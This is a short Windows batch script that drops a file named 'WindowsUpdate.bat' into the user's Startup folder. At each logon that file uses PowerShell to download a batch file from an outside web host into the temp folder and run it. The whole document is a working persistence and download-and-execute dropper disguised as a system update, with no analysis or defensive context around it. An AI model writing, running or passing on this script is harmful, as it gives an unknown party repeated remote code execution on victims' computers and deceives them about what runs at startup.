@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

(
echo @echo off
echo powershell -c "iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\t.bat; & $env:TEMP\t.bat"
) > "%startup%\WindowsUpdate.bat"

exit
